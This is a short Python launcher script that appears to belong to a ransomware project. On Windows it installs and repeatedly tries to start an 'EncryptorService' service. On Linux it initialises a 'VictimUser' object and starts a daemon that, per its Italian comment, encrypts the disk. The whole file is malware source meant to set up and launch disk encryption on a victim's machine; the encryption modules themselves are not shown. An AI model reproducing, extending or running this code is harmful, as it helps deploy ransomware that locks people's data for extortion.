#!/usr/bin/python

import os
import sys

import User

OS = os.name

if OS == "nt":

    from WinService import EncryptorService

    os.system('"' + sys.executable + '" ' + os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'WinService.py') + ' install')
    
    while True:
        try: 
            os.system("NET START " + EncryptorService._svc_name_)
            break
        except:
            continue

elif OS == "posix":

    from daemon import runner
    import DaemonLinux

    # Inizializzazione dati utente
    myUser = User.VictimUser()
    myUser.initUserData()

    # Il demone adesso pensera' a cifrare il disco
    daemon = DaemonLinux.DaemonLinux()
    daemon_runner = runner.DaemonRunner(daemon)
    daemon_runner.do_action()
